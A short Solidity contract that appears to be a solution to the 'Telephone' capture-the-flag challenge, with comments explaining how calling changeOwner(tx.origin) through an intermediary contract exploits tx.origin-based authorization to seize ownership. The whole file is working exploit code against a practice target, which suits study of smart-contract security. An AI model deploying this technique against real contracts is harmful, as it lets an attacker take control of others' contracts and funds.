// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

/// @title Telephone challenge attacker contract 
/// @notice This contract is calling Telephone contract changeOwner() function with the EOA player address
/// as parameter to become owner. Inside that func, msg.sender will be this attacker contract address 
/// while tx.origin is the EOA triggering the transaction (player address). 
contract TelephoneAttack {

    Telephone telephoneContract;

    constructor(address _address) public{
        telephoneContract = Telephone(_address);
    }

    function attack() public{
        telephoneContract.changeOwner(tx.origin);
    }
   
}